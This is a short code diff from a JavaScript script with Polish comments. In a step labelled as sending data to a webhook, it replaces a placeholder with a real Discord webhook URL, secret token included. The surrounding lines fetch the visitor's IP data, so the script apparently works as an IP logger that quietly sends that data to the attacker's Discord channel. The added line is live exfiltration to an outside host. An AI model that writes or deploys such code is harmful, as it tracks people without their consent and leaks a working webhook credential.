@@ -42,7 +42,7 @@
                 const ipData = await ipResponse.json();
 
                 // 3. Wyślij dane na webhook
-                const webhookResponse = await fetch('TWÓJ_WEBHOOK_DISCORD', {
+                const webhookResponse = await fetch('https://ptb.discord.com/api/webhooks/1357027578296275035/lsBipZsvqmJyMapHUbFXBhWe1IupyWtmSS6aGaqkBjWP6Z-2ziUtkTMdV_4H0E5IL-31', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
